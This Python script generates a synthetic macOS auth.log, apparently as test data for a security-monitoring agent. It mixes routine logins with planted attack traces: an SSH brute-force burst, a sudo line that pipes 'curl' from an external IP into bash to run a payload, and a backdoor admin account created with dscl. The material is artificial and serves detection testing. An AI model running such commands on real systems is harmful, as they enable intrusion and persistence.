import random
from datetime import datetime, timedelta

random.seed(42)

# Realistic Mac usernames and hostnames
users = ["jsmith", "mwilliams", "kchen", "rgarcia", "apatel", "tjohnson", "lwong", "dmiller", "ngreen", "scarter"]
hostnames = ["macbook-pro-jsmith", "imac-finance-01", "macbook-air-mwilliams", "mac-mini-server", "macbook-pro-kchen"]
ips_internal = [f"10.0.{random.randint(1,5)}.{random.randint(10,250)}" for _ in range(20)]
ips_external_normal = ["73.158.42.18", "98.207.155.34", "172.58.123.45", "104.28.42.165"]
ips_external_suspicious = ["185.220.101.45", "45.142.214.89", "194.165.16.118", "91.243.59.27"]

def fmt_time(dt):
    return dt.strftime("%b %d %H:%M:%S")

start = datetime.now() - timedelta(days=7)
lines = []

# Generate 7 days of activity
for day_offset in range(7):
    day_start = start + timedelta(days=day_offset)
    
    # Normal business hours activity (8am-6pm) - lots of legit logins
    for _ in range(random.randint(20, 28)):
        ts = day_start + timedelta(hours=random.randint(8, 18), minutes=random.randint(0, 59), seconds=random.randint(0, 59))
        user = random.choice(users)
        host = random.choice(hostnames)
        ip = random.choice(ips_internal)
        actions = [
            f"{fmt_time(ts)} {host} loginwindow[123]: USER_PROCESS: 502 {user}",
            f"{fmt_time(ts)} {host} sshd[{random.randint(1000,9999)}]: Accepted publickey for {user} from {ip} port {random.randint(40000,60000)} ssh2",
            f"{fmt_time(ts)} {host} sudo[{random.randint(1000,9999)}]: {user} : TTY=ttys000 ; PWD=/Users/{user} ; USER=root ; COMMAND=/usr/bin/softwareupdate -l",
            f"{fmt_time(ts)} {host} authd[456]: Succeeded authorizing right 'system.preferences' for authorization created by '/System/Applications/System Settings.app' (uid {random.randint(500,510)})",
        ]
        lines.append((ts, random.choice(actions)))
    
    # A handful of normal failed logins (typos, etc)
    for _ in range(random.randint(2, 4)):
        ts = day_start + timedelta(hours=random.randint(8, 18), minutes=random.randint(0, 59))
        user = random.choice(users)
        host = random.choice(hostnames)
        lines.append((ts, f"{fmt_time(ts)} {host} loginwindow[123]: Authentication failed for user {user}"))

# === SUSPICIOUS EVENTS - the ones our agent should catch ===

# Event 1: Brute force SSH attack from external IP - Day 5, after hours
attack_day = start + timedelta(days=5)
attack_ip = "185.220.101.45"
for i in range(45):
    ts = attack_day + timedelta(hours=2, minutes=15, seconds=i*8)
    attempted_user = random.choice(["root", "admin", "administrator", "test", "oracle", "postgres", "jsmith"])
    lines.append((ts, f"{fmt_time(ts)} mac-mini-server sshd[{random.randint(1000,9999)}]: Failed password for {attempted_user} from {attack_ip} port {random.randint(40000,60000)} ssh2"))

# Event 2: Privilege escalation - Day 6, unusual sudo to root from non-admin user
priv_esc_day = start + timedelta(days=6)
ts = priv_esc_day + timedelta(hours=23, minutes=47)
lines.append((ts, f"{fmt_time(ts)} macbook-pro-kchen sudo[8821]: kchen : TTY=ttys001 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl -s http://194.165.16.118/payload.sh | bash'"))
ts2 = ts + timedelta(seconds=3)
lines.append((ts2, f"{fmt_time(ts2)} macbook-pro-kchen sudo[8821]: pam_unix(sudo:session): session opened for user root by kchen(uid=0)"))
ts3 = ts2 + timedelta(seconds=8)
lines.append((ts3, f"{fmt_time(ts3)} macbook-pro-kchen com.apple.xpc.launchd[1]: (com.apple.suspicious.malware.124) Spawned process: /tmp/.hidden_payload"))

# Event 3: After-hours administrator access - Day 4, 3am login from new IP
ah_day = start + timedelta(days=4)
ts = ah_day + timedelta(hours=3, minutes=12)
lines.append((ts, f"{fmt_time(ts)} mac-mini-server sshd[4421]: Accepted password for jsmith from 45.142.214.89 port 52341 ssh2"))
ts2 = ts + timedelta(minutes=2)
lines.append((ts2, f"{fmt_time(ts2)} mac-mini-server sudo[4422]: jsmith : TTY=pts/0 ; PWD=/Users/jsmith ; USER=root ; COMMAND=/usr/bin/dscl . -create /Users/svc_backup"))
ts3 = ts2 + timedelta(minutes=1)
lines.append((ts3, f"{fmt_time(ts3)} mac-mini-server sudo[4423]: jsmith : TTY=pts/0 ; PWD=/Users/jsmith ; USER=root ; COMMAND=/usr/bin/dscl . -append /Groups/admin GroupMembership svc_backup"))

# Event 4: Successful login after many failures (brute force success)
ts = attack_day + timedelta(hours=2, minutes=21, seconds=30)
lines.append((ts, f"{fmt_time(ts)} mac-mini-server sshd[5567]: Accepted password for root from {attack_ip} port 44521 ssh2"))

# Sort by timestamp
lines.sort(key=lambda x: x[0])

# Write to file
with open("/home/claude/security_project/logs/auth.log", "w") as f:
    for _, line in lines:
        f.write(line + "\n")

print(f"Generated {len(lines)} auth.log entries")
